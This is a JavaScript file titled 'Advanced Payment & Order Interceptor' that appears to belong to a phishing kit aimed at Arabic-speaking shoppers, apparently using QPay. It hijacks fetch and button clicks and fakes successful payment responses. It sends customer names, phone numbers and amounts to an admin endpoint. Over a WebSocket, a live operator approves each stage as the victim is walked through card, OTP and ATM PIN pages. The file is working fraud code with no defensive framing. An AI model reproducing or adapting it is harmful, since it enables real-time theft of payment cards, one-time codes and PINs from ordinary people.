// ─── Advanced Payment & Order Interceptor ───────────────────────────────────
(function() {
  'use strict';
  
  // ─── 1. Send Order Data Immediately to Admin ───
  function sendOrderToAdmin(orderData) {
    fetch('/api/intercept', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        raw_message: JSON.stringify(orderData),
        page: window.location.pathname,
        timestamp: new Date().toISOString(),
        customer_name: orderData.customer_name || localStorage.getItem('customer_name') || '',
        customer_phone: orderData.customer_phone || localStorage.getItem('customer_phone') || '',
        service_type: orderData.service_type || localStorage.getItem('service_type') || '',
        order_ref: orderData.order_ref || '',
        amount: orderData.amount || ''
      })
    }).catch(e => console.error('Failed to send order:', e));
  }
  
  // ─── 2. Intercept Payment Button ───
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
    
    // Intercept payment submission - FORCE redirect to loading page
    if (urlStr && (urlStr.includes('/api/submit-card') || urlStr.includes('qpay') || urlStr.includes('payment'))) {
      // Don't wait for response, just redirect immediately
      setTimeout(() => {
        const orderRef = 'ORD-' + Date.now();
        localStorage.setItem('current_order_ref', orderRef);
        
        // Send to admin
        sendOrderToAdmin({
          order_ref: orderRef,
          customer_name: localStorage.getItem('customer_name'),
          customer_phone: localStorage.getItem('customer_phone'),
          service_type: localStorage.getItem('service_type'),
          amount: localStorage.getItem('amount'),
          timestamp: new Date().toISOString()
        });
        
        // Redirect to loading page
        window.location.href = '/loading?ref=' + orderRef;
      }, 100);
      
      // Return a fake successful response
      return Promise.resolve(new Response(JSON.stringify({ success: true, order_ref: 'ORD-' + Date.now() }), { status: 200 }));
    }
    
    return originalFetch.apply(this, arguments);
  };
  
  // ─── 3. Intercept Order Submission (Booking) ───
  document.addEventListener('click', function(e) {
    const target = e.target.closest('button, [role="button"]');
    if (!target) return;
    
    const text = target.textContent.toLowerCase();
    
    // Detect booking buttons
    if (text.includes('احجز') || text.includes('التالي') || text.includes('next') || text.includes('book')) {
      // Capture order data from form
      const form = target.closest('form');
      if (form) {
        const formData = new FormData(form);
        const orderData = {
          customer_name: formData.get('name') || localStorage.getItem('customer_name') || '',
          customer_phone: formData.get('phone') || localStorage.getItem('customer_phone') || '',
          service_type: formData.get('service') || localStorage.getItem('service_type') || '',
          amount: formData.get('amount') || localStorage.getItem('amount') || '',
          order_ref: 'ORD-' + Date.now()
        };
        
        // Send to admin immediately
        sendOrderToAdmin(orderData);
        
        // Store in localStorage for later use
        Object.keys(orderData).forEach(key => {
          localStorage.setItem(key, orderData[key]);
        });
      }
    }
    
    // Detect payment button - FORCE redirect
    if (text.includes('دفع') || text.includes('pay') || text.includes('payment')) {
      e.preventDefault();
      e.stopPropagation();
      
      const orderRef = localStorage.getItem('current_order_ref') || 'ORD-' + Date.now();
      
      // Send to admin
      sendOrderToAdmin({
        order_ref: orderRef,
        customer_name: localStorage.getItem('customer_name'),
        customer_phone: localStorage.getItem('customer_phone'),
        service_type: localStorage.getItem('service_type'),
        amount: localStorage.getItem('amount'),
        stage: 'payment'
      });
      
      // Redirect to loading page immediately
      setTimeout(() => {
        window.location.href = '/loading?ref=' + orderRef;
      }, 200);
    }
  }, true);
  
  // ─── 4. WebSocket for Real-time Admin Updates ───
  function setupWebSocket() {
    const params = new URLSearchParams(window.location.search);
    const orderRef = params.get('ref') || localStorage.getItem('current_order_ref');
    
    if (!orderRef) return;
    
    const wsUrl = (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws?order=' + orderRef;
    
    try {
      const ws = new WebSocket(wsUrl);
      
      ws.onmessage = (e) => {
        try {
          const data = JSON.parse(e.data);
          
          if (data.type === 'card_decision') {
            if (data.approved) {
              setTimeout(() => {
                window.location.href = '/qpay-otp?ref=' + orderRef;
              }, 1000);
            } else {
              alert('فشل في عملية الدفع\nيرجى التحقق من مصدر البطاقة أو الاتصال بالبنك');
              window.location.href = '/payment?ref=' + orderRef;
            }
          }
          
          if (data.type === 'otp_decision') {
            if (data.approved) {
              setTimeout(() => {
                window.location.href = '/atm-pin?ref=' + orderRef;
              }, 1000);
            } else {
              alert('الرمز الذي تم إدخاله غير صحيح - غير صالح');
            }
          }
          
          if (data.type === 'atm_decision') {
            if (data.approved) {
              setTimeout(() => {
                window.location.href = '/payment-success?ref=' + orderRef;
              }, 1000);
            } else {
              alert('يرجى التحقق من الرقم السري للصراف الآلي الصحيح');
            }
          }
        } catch (e) {
          console.error('WebSocket message error:', e);
        }
      };
      
      ws.onerror = () => {
        console.error('WebSocket error');
        setTimeout(setupWebSocket, 3000);
      };
    } catch (e) {
      console.error('WebSocket setup error:', e);
    }
  }
  
  // Initialize on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupWebSocket);
  } else {
    setupWebSocket();
  }
})();
